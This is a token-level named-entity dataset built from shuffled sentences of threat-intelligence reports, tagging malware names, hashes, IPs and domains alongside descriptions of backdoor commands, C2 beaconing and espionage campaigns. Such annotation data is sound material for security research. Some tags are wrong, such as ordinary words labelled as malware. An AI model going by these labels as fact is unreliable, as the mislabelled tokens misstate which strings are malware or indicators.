that	O
the	O
encryption	O
mechanism	O
(	O
needed	O
to	O
read	O
and/or	O
fake	O
bot	O
phone	O
home	O
messages	O
)	O
is	O
symmetric	O
.	O

By	O
modifying	O
the	O
local	O
instance	O
of	O
SWIFT	O
Alliance	O
Access	O
software	O
,	O
the	O
malware	O
grants	O
itself	O
the	O
ability	O
to	O
execute	O
database	O
transactions	O
within	O
the	O
victim	O
network	O
.	O

Normally	O
,	O
Bandook	B-malware.unknown
is	O
distributed	O
with	O
an	O
initial	O
stub	O
.	O

Persistent	O
backdoor	O
,	O
dropper	O
and	O
cryptocurrency	O
theft	O
module	O
.	O

Keylogging	O
,	O
ZXARPS	B-malware.unknown
(	O
IP	O
and	O
URL	O
spoofing	O
)	O
,	O
and	O
SYNFlood	O
are	O
some	O
of	O
the	O
interesting	O
features	O
added	O
to	O
version	O
3.2	O
.	O

At	O
least	O
one	O
observed	O
phishing	O
lure	B-malware.infosteal
delivered	O
a	O
Cobalt	O
Strike	O
payload	O
.	O

This	O
particular	O
malware	O
takes	O
advantage	O
of	O
this	O
vulnerability	O
and	O
drops	O
a	O
DLL	O
called	O
ntshrui.DLL	O
in	O
the	O
C	O
:	O
\Windows	O
directory	O
.	O

Figure	O
1	O
.	O

The	O
attackers	O
posted	O
master	O
decryption	O
keys	O
on	O
the	O
BleepingComputer	O
forum	O
,	O
along	O
with	O
the	O
assertion	O
that	O
this	O
was	O
done	O
because	O
the	O
original	O
author	O
claimed	O
that	O
the	O
source	O
was	O
stolen	O
and	O
used	O
in	O
the	O
Ukraine	O
incident	O
.	O

Based	O
on	O
command	O
and	O
control	O
(	O
C	O
&	O
C	O
)	O
server	O
information	O
found	O
being	O
used	O
by	O
CozyDuke	B-malware.drop
tools	O
,	O
we	O
believe	O
the	O
CozyDuke	B-malware.drop
toolset	O
is	O
used	O
by	O
at	O
least	O
one	O
malicious	O
actor	O
who	O
also	O
uses	O
,	O
or	O
at	O
the	O
least	O
shares	O
,	O
infrastructure	O
with	O
actors	O
using	O
the	O
known	O
threats	O
,	O
MiniDuke	O
and	O
OnionDuke.CozyDuke	B-malware.drop
,	O
as	O
referred	O
to	O
in	O
this	O
document	O
,	O
is	O
a	O
set	O
of	O
tools	O
used	O
by	O
one	O
or	O
more	O
malicious	O
actors	O
for	O
performing	O
targeted	O
attacks	O
against	O
high	O
profile	O
organizations	O
.	O

Followed	O
shortly	O
after	O
by	O
connections	O
to	O
:	O

'	O
www.tas-cas.org	B-url.normal
.	O
'	O

Less	O
than	O
48	O
hours	O
after	O
Cybereason	O
alerted	O
the	O
company	O
about	O
the	O
breach	O
,	O
the	O
attackers	O
started	O
to	O
change	O
their	O
approach	O
and	O
almost	O
completely	O
abandoned	O
the	O
PowerShell	O
infrastructure	O
that	O
they	O
had	O
been	O
using	O
–	O
replacing	O
it	O
with	O
sophisticated	O
custom-built	O
backdoors	O
.	O

The	O
compilation	O
timestamps	O
of	O
the	O
binaries	O
date	O
back	O
to	O
August	O
2011	O
.	O

delivery	O
email	O
source	O
address	O
a5b3fb5119fad72ac321d8d6416b6b92	B-hash
30b843343590518e7b62c5f6db394bc2	B-hash
2a654ecb26664013d8e2369fe9c0b565	B-hash
b11b7b7b5bd80779dd885628d65e02e5	B-hash
Folder.exe	O
cc24cd17fa93fce7ea1128edeb9ee40b	B-hash
5e906ccb3b67131e4771ca72609c0648	B-hash
Drops	O
b11b7b7b5bd80779dd885628d65e02e5	B-hash
ad5531b085ef005ee12319e88fb8f674	B-hash
2f5397ad6205ab4463e6e3be9aba4efe	B-hash
0ae4345213cad388dbe38e2acda1a489	B-hash
28a5e9b2ef5cfd2edb7f31d3da9a5a15	B-hash
8655af063090ef192a7f1e0c05c7883f	B-hash
6e66ed5d8c7d4ca9c2e96f2cc045eb94	B-hash
d01848a20e0f5c4a7a7243bb98a7b26c	B-hash
923844dfc3d5b21f288df9beaa958baf	B-hash
639d768d575c45372ea707ed89423f36	B-hash

As	O
a	O
result	O
,	O
the	O
threat	O
posed	O
by	O
these	O
RATs	B-malware.backdoor
should	O
not	O
be	O
underestimated	O
.	O

All	O
rights	O
reserved	O
.	O

TABLE	O
2	O
:	O
APT28	B-malware.infosteal
NET	O
WO	O
R	O
K	O
AC	O
TIVIT	O
Y	O
HAS	O
LI	O
K	O
ELY	O
SU	O
PP	O
O	O
RTED	O
I	O
N	O
FO	O
R	O
MATIO	O
N	O
O	O
PER	O
ATIO	O
N	O
S	O

This	O
Tipper	O
builds	O
on	O
CrowdStrike	O
's	O
previous	O
reporting	O
by	O
providing	O
a	O
timeline	O
of	O
events	O
,	O
contextual	O
discussion	O
regarding	O
the	O
potential	O
drivers	O
for	O
development	O
and	O
deployment	O
of	O
the	O
malware	O
,	O
and	O
a	O
description	O
of	O
the	O
analytical	O
process	O
resulting	O
in	O
targeting	O
assessments	O
.	O

Analysis	O
of	O
this	O
incident	O
led	O
us	O
to	O
believe	O
that	O
this	O
operation	O
and	O
the	O
group	O
behind	O
it	O
which	O
we	O
call	O
Libyan	B-malware.infosteal
Scorpions	I-malware.infosteal
is	O
a	O
malware	O
operation	O
in	O
use	O
since	O
September	O
2015	O
and	O
operated	O
by	O
a	O
politically	O
motivated	O
group	O
whose	O
main	O
objective	O
is	O
intelligence	O
gathering	O
,	O
spying	O
on	O
influentials	O
and	O
political	O
figures	O
and	O
operate	O
an	O
espionage	O
campaign	O
within	O
Libya	O
.	O

6811E636E69E9AEFA5C6	O
.	O

In	O
total	O
,	O
we	O
found	O
two	O
different	O
variants	O
of	O
changed	O
versions	O
.	O

They	O
are	O
hard	O
coded	O
in	O
the	O
binaries	O
.	O

Read	O
our	O
security	O
predictions	O
for	O
2018	O
.	O

Cylance	O
tracks	O
this	O
threat	O
group	O
internally	O
as	O
'	O
Snake	O
Wine	O
'	O
.	O

The	O
following	O
is	O
a	O
screenshot	O
of	O
the	O
email	O
:	O
The	O
'	O
reports-pdf.jar	B-malware.infosteal
'	O
malware	O
beaconed	O
to	O
'	O
184.22.201[.]27	B-malware.infosteal
'	O
over	O
port	O
'	O
3030	O
'	O
.	O

Meterpreter	O
then	O
loaded	O
Cobalt	O
Strike	O
BEACON	O
,	O
configured	O
to	O
communicate	O
with	O
80.255.3[.]87	B-ip.unknown
using	O
the	O
Safebrowsing	O
malleable	O
C2	O
profile	O
to	O
further	O
blend	O
in	O
with	O
network	O
traffic	O
.	O

2016	O
.	O

When	O
it	O
detects	O
the	O
existence	O
of	O
analysis	O
toolsets	O
,	O
the	O
executable	O
file	O
bails	O
out	O
from	O
further	O
execution	O
.	O

The	O
malware	O
known	O
as	O
RATANKBA	B-malware.backdoor
is	O
just	O
one	O
of	O
the	O
weapons	O
in	O
Lazarus	O
'	O
arsenal	O
.	O

Backdoors	O
exploiting	O
DLL	O
sideloading	O
attacks	O
in	O
legitimate	O
applications	O
from	O
Microsoft	O
,	O
Google	O
and	O
Kaspersky	O
.	O

The	O
threat	O
actors	O
behind	O
the	O
attack	O
have	O
control	O
over	O
fi	O
ve	O
subdomains	O
of	O
the	O
'	O
pzchao.com	B-url.unknown
'	O
domain	O
.	O

-=	O
FortiGuard	O
Lion	O
Team	O
=-	O

This	O
must	O
be	O
done	O
with	O
great	O
care	O
in	O
order	O
to	O
avoid	O
security	O
issues	O
and	O
should	O
not	O
be	O
something	O
the	O
average	O
home	O
user	O
does	O
.	O

In	O
this	O
case	O
the	O
Double	O
XOR	O
with	O
0x70	O
and	O
0x79	O
is	O
mathematically	O
equivalent	O
to	O
a	O
Single	O
XOR	O
operation	O
using	O
0x09	O
.	O

Web	O
server	O
with	O
numerous	O
sites	O
(	O
alumni	O
sites	O
,	O
sites	O
of	O
industrial	O
and	O
engineering	O
companies	O
,	O
etc	O
.	O
)	O

However	O
,	O
there	O
are	O
still	O
clues	O
to	O
look	O
at	O
–	O
for	O
example	O
,	O
what	O
other	O
executables	O
connect	O
to	O
these	O
C	O
&	O
C	O
hosts	O
.	O

5	O
.	O

Figure	O
15	O
.	O

1	O
(	O
Primary	O
)	O
41926080	O
62417880	O
41926079	O
62417879	O
82909679	O

We	O
can	O
see	O
that	O
the	O
link	O
was	O
clicked	O
210	O
times	O
,	O
out	O
of	O
which	O
130	O
were	O
in	O
Israel	O
,	O
32	O
in	O
the	O
United	O
States	O
,	O
9	O
in	O

The	O
Bitcoin	O
miner	O
application	O
(	O
both	O
32-bit	O
and	O
64-bit	O
)	O
is	O
renamed	O
as	O
java.exe	O
and	O
used	O
for	O
bitcoin	O
mining	O
every	O
three	O
weeks	O
at	O
3	O
AM	O
.	O

Shellcode	O
marker	O
in	O
spearphished	B-malware.unknown
documents	O
Top	O
target	O
country	O
Compression	O
algorithm	O
used	O
for	O
C	O
&	O
C	O
communications	O
C	O
&	O
C	O
servers	O
claim	O
to	O
be	O
/	O
redirect	O
to	O
BBC	O
(	O
mobile	O
malware	O
)	O
Russia	O
PT	O
@	O
T	O
LZMA	O
Compiler	O
version	O
VC	O
2010	O
(	O
build	O
30319	O
)	O
PT	O
@	O
T	O
Russia	O
LZMA	O
VC	O
2010	O
(	O
build	O
30319	O
)	O
(	O
some	O
modules	O
)	O

Eyewitness	O
accounts	O
from	O
individuals	O
within	O
the	O
impacted	O
units	O
reported	O
seeing	O
an	O
unmanned	O
aerial	O
vehicle	O
(	O
UAV	O
)	O
used	O
in	O
the	O
area	O
prior	O
to	O
one	O
attack	O
,	O
underscoring	O
the	O
need	O
for	O
precise	O
locational	O
data	O
for	O
these	O
particular	O
strikes	O
and	O
introducing	O
the	O
possibility	O
that	O
the	O
Android	O
malware	O
served	O
to	O
support	O
the	O
reconnaissance	O
role	O
of	O
traditional	O
battlefield	O
assets	O
.	O

The	O
account	O
is	O
hardcoded	O
in	O
the	O
module	O
along	O
with	O
the	O
master	O
's	O
e-mail	O
to	O
which	O
it	O
sends	O
intercepted	O
documents	O
.	O

It	O
's	O
interesting	O
to	O
note	O
that	O
the	O
group	O
appears	O
to	O
be	O
altering	O
the	O
compilation	O
and	O
linker	O
timestamps	O
of	O
its	O
executable	O
code	O
to	O
dates	O
in	O
2013	O
.	O

Recipients	O
of	O
this	O
report	O
are	O
encouraged	O
to	O
contribute	O
any	O
additional	O
information	O
that	O
they	O
may	O
have	O
related	O
to	O
this	O
threat	O
.	O

Victims	O
have	O
also	O
been	O
observed	O
in	O
Western	O
Europe	O
,	O
Brazil	O
,	O
China	O
,	O
Japan	O
,	O
Mexico	O
,	O
New	O
Zealand	O
,	O
South	O
Korea	O
,	O
Turkey	O
and	O
Central	O
Asian	O
countries	O
.	O

Penetration	O
Testing	O
:	O
Have	O
we	O
attempted	O
to	O
hack	O
into	O
our	O
own	O
systems	O
to	O
test	O
the	O
security	O
of	O
our	O
systems	O
and	O
our	O
ability	O
to	O
defend	O
against	O
attacks	O
?	O

Download	O
:	O
download	O
a	O
file	O
from	O
the	O
compromised	O
system	O
;	O
the	O
bot	O
will	O
respond	O
with	O
a	O
message	O
with	O
the	O
header	O
$	O
fileDownload	O
$	O
.	O

Within	O
the	O
social	O
space	O
around	O
'	O
Netbot	O
Attacker	O
'	O
are	O
individuals	O
who	O
are	O
testing	O
and/or	O
asking	O
for	O
technical	O
support	O
regarding	O
the	O
malware	O
package	O
operation	O
.	O

Subscribe	O

The	O
result	O
is	O
reported	O
to	O
the	O
C	O
&	O
C	O
server	O
.	O

Stuxnet	O
's	O
main	O
payload	O
has	O
the	O
main	O
purpose	O
of	O
modifying	O
code	O
on	O
Siemens	O
industrial	O
PLCs	O
in	O
order	O
to	O
sabotage	O
the	O
system	O
.	O

The	O
attacker	O
traffic	O
shows	O
z1	O
and	O
z2	O
parameters	O
immediately	O
after	O
the	O
end	O
of	O
the	O
'	O
Password	O
'	O
parameter	O
.	O

The	O
lure	O
documents	O
captured	O
in	O
this	O
attack	O
are	O
in	O
The	O
attackers	O
exploit	O
office	O
with	O
OLE	O
autolink	O
objects	O
(	O
CVE-2017-0199	B-malware.unknown
)	O
to	O
embed	O
the	O
documents	O
onto	O
malicious	O
websites	O
.	O

In	O
addition	O
,	O
to	O
make	O
sure	O
the	O
RAT	B-malware.backdoor
always	O
runs	O
(	O
since	O
host	O
process	O
might	O
be	O
closed	O
or	O
crash	O
)	O
,	O
the	O
RAT	B-malware.backdoor
creates	O
a	O
task	O
in	O
the	O
Windows	O
task	O
scheduler	O
named	O
'	O
Microsoft	O
Boost	O
Kernel	O
Optimization	O
'	O
which	O
will	O
re-run	O
the	O
injection	O
routine	O
every	O
20	O
minutes	O
.	O

In	O
response	O
,	O
if	O
the	O
status	O
is	O
OK	O
,	O
then	O
a	O
TOKEN	O
is	O
received	O
from	O
the	O
C2	O
server	O
that	O
is	O
used	O
to	O
synchronize	O
the	O
activities	O
between	O
the	O
victim	O
's	O
machine	O
and	O
the	O
C2	O
server	O
.	O

Symantec	O
found	O
evidence	O
that	O
it	O
had	O
tried	O
to	O
compromise	O
a	O
large	O
international	O
travel	O
reservations	O
 rm	O
.	O

This	O
code	O
was	O
borrowed	O
from	O
Win32/Diskcoder.Petya	O
ransomware	O
.	O

Talos	O
identified	O
another	O
legitimate	O
app	O
executing	O
malicious	O
code	O
during	O
this	O
campaign	O
in	O
India	O
.	O

When	O
the	O
backdoor	O
receives	O
the	O
response	O
from	O
the	O
C	O
&	O
C	O
server	O
,	O
the	O
final	O
payload	O
needs	O
to	O
be	O
decoded	O
again	O
in	O
a	O
similar	O
manner	O
via	O
decryption	O
and	O
scrambling	O
.	O

样本分析	O
(	O
13	O
)	O

The	O
title	O
is	O
compared	O
against	O
a	O
hardcoded	O
list	O
of	O
Brazilian	O
banking	O
and	O
digital	O
coin	O
sites	O
.	O

This	O
blog	O
will	O
outline	O
details	O
on	O
various	O
aspects	O
of	O
the	O
discovered	O
attack	O
,	O
the	O
potential	O
targeting	O
of	O
Qatar	O
,	O
and	O
suggestions	O
for	O
defenses	O
against	O
similar	O
attack	O
chains	O
.	O

A	O
CRC	O
algorithm	O
tends	O
to	O
indicate	O
the	O
malware	O
package	O
is	O
of	O
Chinese	O
origin	O
,	O
and	O
many	O
attacks	O
are	O
sourced	O
out	O
of	O
a	O
service	O
called	O
3322.org	O
—	O
a	O
small	O
company	O
operating	O
out	O
of	O
Changzhou	O
.	O

12	O

©	O
AhnLab	O
,	O
Inc	O
.	O

While	O
the	O
user	O
unsuspectingly	O
reads	O
the	O
document	O
,	O
the	O
following	O
routine	O
runs	O
hidden	O
in	O
the	O
background	O
:	O
The	O
malware	O
first	O
unpacks	O
the	O
'	O
Reflective	O
Loader	O
'	O
component	O
into	O
the	O
memory	O
and	O
signals	O
to	O
its	O
'	O
C2	O
parents	O
'	O
the	O
attack	O
has	O
been	O
executed	O
by	O
downloading	O
an	O
image	O
file	O
from	O
a	O
remote	O
server	O
.	O

Some	O
of	O
these	O
threats	O
have	O
been	O
attributed	O
to	O
state-sponsored	O
actors	O
,	O
others	O
to	O
cyber	O
criminals	O
or	O
to	O
espionage	O
attacks	O
.	O

It	O
is	O
noteworthy	O
that	O
this	O
function	O
includes	O
the	O
code	O
to	O
set	O
the	O
ZxShell	B-malware.backdoor
node	O
as	O
a	O
server	O
:	O
if	O
one	O
of	O
the	O
hardcoded	O
boolean	O
value	O
is	O
set	O
to	O
1	O
,	O
a	O
listening	O
socket	O
is	O
created	O
.	O

http://www.mediafire.com/download/[REDACTED]/VPN-Pro.zip	O

Packets	O
belonging	O
to	O
the	O
subsystem	O
have	O
a	O
common	O
header	O
,	O
much	O
like	O
the	O
other	O
derived	O
classes	O
.	O

The	O
IRGC	O
has	O
a	O
vast	O
domestic	O
information	O
security	O
and	O
monitoring	O
mandate	O
,	O
as	O
well	O
as	O
broad	O
foreign	O
mission	O
,	O
and	O
has	O
been	O
linked	O
to	O
cyberattacks	O
against	O
Western	O
institutions	O
since	O
at	O
least	O
2011	O
.	O

Otherwise	O
,	O
it	O
will	O
execute	O
the	O
remote	O
command	O
,	O
effectively	O
giving	O
the	O
attackers	O
full	O
control	O
over	O
the	O
compromised	O
system	O
.	O

The	O
backdoor	O
will	O
accept	O
the	O
following	O
commands	O
:	O

11	O
May	O
2016	O
.	O

Bennett	O
.	O

Sample	O
#	O
3	O
(	O
RSW7B37.tmp	B-malware.unknown
)	O
is	O
an	O
example	O
of	O
this	O
file	O
.	O

The	O
sample	O
we	O
analyzed	O
was	O
a	O
Word	O
document	O
used	O
as	O
a	O
lure	O
for	O
unsuspecting	O
victims	O
.	O

Sample	O
A	O
has	O
been	O
debugged	O
until	O
Sample	O
B	O
's	O
decompression	O
finished	O
.	O

init	O
]	O

Attackers	O
are	O
starting	O
to	O
invest	O
in	O
longterm	O
operations	O
that	O
target	O
specific	O
processes	O
enterprises	O
rely	O
on	O
.	O

이후	O
발견된	O
문서	O
파일로	O
미루어	O
이	O
공격	O
그룹이	O
주로	O
방위산업체에	O
대한	O
공격을	O
지속적으로	O
진행한	O
것으	O
로	O
보인다	O
.	O

TOOLMARK	O
DESCRIPTION	O

KB647152.exe	O

Figure	O
7	O
:	O
Alternate	O
macro	O
This	O
macro	O
uses	O
Casey	O
Smith	O
's	O
'	O
Squiblydoo	O
'	O
Application	O
Whitelisting	O
bypass	O
technique	O
to	O
run	O
the	O
command	O
in	O
Figure	O
8	O
.	O

More	O
work	O
needs	O
to	O
be	O
done	O
to	O
identify	O
how	O
FEIB	O
was	O
attacked	O
,	O
whether	O
further	O
custom	O
tools	O
were	O
involved	O
,	O
confirm	O
the	O
context	O
of	O
the	O
Lazarus	B-malware.unknown
malware	O
in	O
the	O
intrusion	O
,	O
and	O
where	O
else	O
this	O
Hermes	O
ransomware	O
has	O
been	O
seen	O
.	O

Sleep	O
Scripting	O
Language	O
An	O
extensible	O
general	O
purpose	O
language	O
with	O
Perl	O
inspired	O
syntax	O
for	O
the	O
Java	O
platform	O
.	O

MAY	O
2014	O
Ukrainian	O
officials	O
revealed	O
that	O
the	O
investigation	O
into	O
the	O
compromise	O
of	O
the	O
CEC	O
's	O
internal	O
network	O
identified	O
malware	O
traced	O
to	O
APT28	B-malware.infosteal
.	O

The	O
Imam	O
Hossein	O
Comprehensive	O
University	O
(	O
IHU	O
)	O
is	O
an	O
Iranian	O
university	O
based	O
in	O
Tehran	O
that	O
is	O
affiliated	O
with	O
the	O
Iranian	O
Revolutionary	O
Guard	O
Corps	O
(	O
IRGC	O
)	O
,	O
the	O
Iranian	O
Ministry	O
of	O
Science	O
,	O
Research	O
and	O
Technology	O
,	O
and	O
the	O
Iranian	O
Ministry	O
of	O
Defense	O
and	O
Armed	O
Forces	O
Logistics	O
.	O

In	O
April	O
2018	O
,	O
while	O
monitoring	O
public	O
data	O
feeds	O
,	O
we	O
noticed	O
an	O
interesting	O
and	O
previously	O
unknown	O
backdoor	O
using	O
HackingTeam	O
's	O
leaked	O
RCS	O
source	O
code	O
.	O

createKeyToken	O
:	O
]	O

Figure	O
16	O
Comparison	O
of	O
module	O
3	O
data	O
package	O

Forensic	O
toolmarks	O
and	O
link	O
analysis	O
have	O
revealed	O
several	O
different	O
threat	O
groups	O
who	O
are	O
employing	O
common	O
IE	O
exploit	O
vectors	O
.	O

It	O
's	O
interesting	O
to	O
note	O
that	O
this	O
version	O
of	O
SPLM	B-malware.backdoor
implements	I-malware.backdoor
communications	O
that	O
are	O
fully	O
encrypted	O
over	O
HTTPS	O
.	O

The	O
Dino	B-malware.backdoor
's	O
custom	O
file	O
system	O
–	O
the	O
so­called	O
ramFS	O
–	O
is	O
present	O
in	O
several	O
droppers	O
used	O
by	O
Animal	O
Farm	O
.	O

openofficev[.]info	O
(	O
2015	O
)	O
office-revision[.]com	O
(	O
2014	O
)	O
online.newssupply[.]net	O
(	O
2011	O
)	O

In	O
addition	O
,	O
our	O
analysis	O
did	O
not	O
identify	O
what	O
triggers	O
the	O
MitM	O
payload	O
to	O
install	O
;	O
the	O
scada.exe	B-malware.unknown
binary	O
that	O
deploys	O
the	O
IRONGATE	B-malware.backdoor
DLL	O
payload	O
appears	O
to	O
require	O
manual	O
execution	O
.	O

For	O
several	O
months	O
,	O
we	O
have	O
been	O
monitoring	O
an	O
ongoing	O
cyber-espionage	O
campaign	O
against	O
South	O
Korean	O
think-tanks	O
.	O

The	O
social	O
engineering	O
part	O
of	O
the	O
campaign	O
seems	O
to	O
have	O
targeted	O
people	O
in	O
Eastern	O
European	O
and	O
Middle	O
Eastern	O
countries	O
.	O

Subject	O
lines	O

Fortunately	O
,	O
new	O
algorithmic	O
technologies	O
like	O
behavioral	O
analytics	O
are	O
now	O
available	O
to	O
rapidly	O
identify	O
unusual	O
or	O
unauthorized	O
activities	O
with	O
minimal	O
false	O
positives	O
,	O
especially	O
when	O
combined	O
with	O
actionable	O
threat	O
intelligence	O
.	O

Consider	O
using	O
type-safe	O
stored	O
procedures	O
and	O
prepared	O
statements	O
.	O

Several	O
Mandiant	O
investigations	O
revealed	O
that	O
,	O
after	O
gaining	O
access	O
,	O
APT32	B-malware.infosteal
regularly	O
cleared	O
select	O
event	O
log	O
entries	O
and	O
heavily	O
obfuscated	O
their	O
PowerShell-based	O
tools	O
and	O
shellcode	O
loaders	O
with	O
Daniel	O
Bohannon	O
's	O
Invoke-Obfuscation	O
framework	O
.	O

We	O
surmise	O
that	O
scada.exe	B-malware.unknown
is	O
a	O
user-created	O
payload	O
used	O
for	O
testing	O
the	O
malware	O
.	O

In	O
addition	O
to	O
the	O
US	O
government	O
,	O
they	O
have	O
targeted	O
organizations	O
across	O
the	O
Defense	O
,	O
Energy	O
,	O
Extractive	O
,	O
Financial	O
,	O
Insurance	O
,	O
Legal	O
,	O
Manufacturing	O
Media	O
,	O
Think	O
Tanks	O
,	O
Pharmaceutical	O
,	O
Research	O
and	O
Technology	O
industries	O
,	O
along	O
with	O
Universities	O
.	O

The	O
'	O
173.224.214.12	B-ip.unknown
'	O
IP	O
address	O
that	O
'	O
fighthard.mooo.com	B-url.unknown
'	O
previously	O
resolved	O
to	O
also	O
historically	O
had	O
two	O
other	O
domains	O
point	O
to	O
it	O
'	O
queenberry.www1.biz	B-url.unknown
'	O
and	O
'	O
word.crabdance.com	B-url.unknown
'	O
.	O

ABOUT	O
HBGARY	O
,	O
INC	O

We	O
wanted	O
to	O
emulate	O
the	O
situation	O
in	O
which	O
one	O
would	O
have	O
multiple	O
partitions	O
on	O
the	O
computers	O
,	O
as	O
is	O
quite	O
common	O
.	O

Widely	O
available	O
,	O
strong	O
cryptography	O
software	O
tools	O
help	O
provide	O
secure	O
and	O
private	O
communications	O
that	O
are	O
now	O
easily	O
obtained	O
and	O
usable	O
.	O

As	O
South	O
Korean	O
exchanges	O
harden	O
their	O
networks	O
and	O
the	O
government	O
imposes	O
stricter	O
regulatory	O
controls	O
on	O
cryptocurrencies	O
,	O
exchanges	O
and	O
users	O
in	O
other	O
countries	O
should	O
be	O
aware	O
of	O
the	O
increased	O
threat	O
level	O
from	O
North	O
Korean	O
actors	O
.	O

RtlGetVersion	O
,	O
KeAreAllApcsDisabled	O
,	O
obtained	O
by	O
calling	O
MmGetSystemRoutineAddress	O

Because	O
of	O
this	O
,	O
we	O
can	O
confirm	O
the	O
following	O
points	O
:	O
There	O
are	O
13	O
compromised	O
devices	O
based	O
off	O
serial	O
number	O
All	O
the	O
devices	O
are	O
located	O
in	O
India	O
(	O
based	O
on	O
the	O
phone	O
numbers	O
and	O
phone	O
providers	O
)	O
Phone	O
models	O
:	O
iPhone	O
5.4	O
,	O
iPhone	O
7.2	O
,	O
iPhone	O
8.1	O
,	O
iPhone	O
8.2	O
,	O
iPhone	O
9.3	O
,	O
iPhone	O
9.4	O
iOS	O
versions	O
:	O
10.2.1	O
,	O
10.3.1	O
,	O
10.3.2	O
,	O
10.3.3	O
,	O
11.0	O
,	O
11.0.3	O
,	O
11.2.1	O
,	O
11.2.5	O
,	O
11.2.6	O
At	O
this	O
time	O
,	O
we	O
do	O
n't	O
know	O
how	O
the	O
attacker	O
enrolled	O
the	O
13	O
targeted	O
devices	O
into	O
the	O
MDM	B-malware.infosteal
.	O

For	O
more	O
information	O
see	O
:	O
http://www.baesystems.com/en/cybersecurity/swift-customer-security-programme	B-url.normal
MD5	O
Hashes	O

Assumptions	O
are	O
based	O
on	O
certain	O
binary	O
attributes	O
,	O
language	O
and	O
location	O
of	O
infrastructure	O
as	O
well	O
as	O
targets	O
.	O

The	O
group	O
was	O
first	O
publicly	O
disclosed	O
by	O
FireEye	O
in	O
this	O
report	O
.	O

Exit	O
/	O
Quit	O
SysInfo	O
SYNFlood	O
CleanEvent	O
MEANING	O
Get	O
help	O
Exit	O
and	O
shut	O
down	O
the	O
botnet	O
client	O
Get	O
target	O
System	O
information	O
Perform	O
a	O
SYN	O
attack	O
on	O
a	O
host	O
Process	O
service	O
Unix	O
command	O
implementation	O
Clear	O
System	O
Event	O
log	O
Find	O
login	O
account	O
password	O
Get	O
time	O
information	O
about	O
a	O
file	O
List	O
all	O
the	O
dial-up	O
accounts	O
and	O
passwords	O
Account	O
Management	O
System	O
Transfer	O
file	O
in	O
or	O
from	O
remote	O
host	O
Run	O
a	O
program	O
in	O
the	O
remote	O
host	O
Service	O
control	O
command	O
,	O
implemented	O
as	O
the	O
Windows	O
one	O
Clone	O
user	O
account	O
Create	O
new	O
process	O
as	O
another	O
User	O
or	O
Process	O
context	O
.	O

VPN-PRO.zip	O
Uploaded	O
:	O
2013-06-15	O
16:54:31	O

It	O
consists	O
of	O
three	O
parts—the	O
Framework	O
Core	O
,	O
the	O
Framework	O
Profile	O
,	O
and	O
Framework	O
Implementation	O
Tiers—and	O
emphasizes	O
five	O
functions	O
:	O
Identify	O
,	O
Protect	O
,	O
Detect	O
,	O
Respond	O
,	O
and	O
Recover	O
.	O

Shortly	O
after	O
this	O
RTF	O
document	O
is	O
opened	O
,	O
the	O
remaining	O
stages	O
of	O
the	O
Inception	B-malware.backdoor
malware	O
are	O
found	O
executing	O
on	O
the	O
system	O
.	O

This	O
further	O
indicates	O
the	O
group	O
's	O
emphasis	O
on	O
vulnerability	O
research	O
.	O

Implement	O
a	O
Sender	O
Policy	O
Framework	O
(	O
SPF	O
)	O
record	O
for	O
your	O
organization	O
's	O
Domain	O
Name	O
System	O
(	O
DNS	O
)	O
zone	O
file	O
to	O
minimize	O
risks	O
relating	O
to	O
the	O
receipt	O
of	O
spoofed	O
messages	O
.	O

29	O
Dec	O
.	O

March	O
2018	O
March	O
2018	O

The	O
attack	O
was	O
initially	O
targeted	O
at	O
several	O
large	O
companies	O
,	O
including	O
Google	O
.	O

Googling	O
for	O
moayy2ad@hotmail.com	B-url.normal
led	O
the	O
following	O
blog	O
,	O
which	O
has	O
been	O
removed	O
in	O
the	O
months	O
after	O
we	O
published	O
the	O
first	O
report	O
:	O

The	O
'	O
china.pdf	O
'	O
file	O
shown	O
to	O
the	O
victims	O
in	O
the	O
last	O
stage	O
of	O
the	O
attack	O
seems	O
to	O
be	O
written	O
in	O
Korean	O
:	O

Using	O
access	O
to	O
this	O
server	O
,	O
attackers	O
pushed	O
a	O
malicious	O
update	O
that	O
was	O
applied	O
automatically	O
without	O
user	O
interaction	O
.	O

As	O
a	O
result	O
of	O
all	O
these	O
steps	O
,	O
the	O
last-stage	O
T	O
rojan	O
is	O
injected	O
into	O
svchost.exe's	O
process	O
memory	O
.	O

Variants	O
with	O
a	O
V2010-v24	O
identifier	O
have	O
a	O
proper	O
MZ/PE	O
header	O
;	O
variants	O
with	O
a	O
V2010-v16	O
header	O
have	O
portions	O
of	O
their	O
header	O
overwritten	O
with	O
JPEG	O
strings	O
.	O

The	O
amount	O
of	O
shared	O
code	O
between	O
Dino	B-malware.backdoor
and	O
known	O
Animal	O
Farm	O
malware	O
leaves	O
very	O
little	O
doubt	O
that	O
Dino	B-malware.backdoor
belongs	O
to	O
Animal	O
Farm	O
's	O
arsenal	O
.	O

Malware	O
then	O
enumerates	O
the	O
list	O
of	O
all	O
the	O
processes	O
running	O
on	O
the	O
system	O
and	O
sends	O
it	O
to	O
the	O
C2	O
server	O
along	O
with	O
the	O
user	O
name	O
and	O
password	O
using	O
a	O
POST	O
request	O
to	O
JobProcesses.php	O
as	O
shown	O
in	O
the	O
below	O
screen	O
shots	O
.	O

We	O
assess	O
,	O
based	O
on	O
Iran	O
's	O
previous	O
reactions	O
to	O
economic	O
pressure	O
,	O
that	O
with	O
President	O
Trump	O
's	O
exit	O
from	O
the	O
JCPOA	O
,	O
Iran	O
is	O
likely	O
to	O
respond	O
by	O
launching	O
cyberattacks	O
on	O
Western	O
businesses	O
within	O
months	O
,	O
if	O
not	O
faster	O
.	O

The	O
creator	O
of	O
the	O
decoy	O
document	O
creator	O
is	O
named	O
'	O
Siada	O
.	O
'	O

Here	O
are	O
two	O
to	O
get	O
started	O
:	O
•	O
Regex	O
basics	O
(	O
http://www.tekdefense.com/news/2012/10/21/tektip-ep12-regex-basics.html	B-url.normal
)	O
•	O
Using	O
regex	O
with	O
Notepad	O
(	O
http://www.tekdefense.com/news/2013/1/6/tektip-ep19-using-regex-with-notepad.html	B-url.normal
)	O
Windows	O
also	O
provides	O
a	O
way	O
to	O
search	O
files	O
using	O
regular	O
expressions	O
with	O
its	O
native	O
findstr	O
command	O
.	O

/2017/06/30/telebots-back-supply-chain-attacks-against-ukraine/	B-url.normal
By	O
Anton	O
Cherepanov	O
posted	O
30	O
Jun	O
2017	O
-	O
03:30PM	O
Ransomware	O
The	O
latest	O
Petya-like	B-malware.ransom
outbreak	O
has	O
gathered	O
a	O
lot	O
of	O
attention	O
from	O
the	O
media	O
.	O

'	O
User­Agent	O
:	O
'	O
;	O
http_header	O
;	O
content	O
:	O
!	O

Highlighting	O
the	O
overkill	O
in	O
this	O
attack	O
,	O
McAfee	O
went	O
so	O
far	O
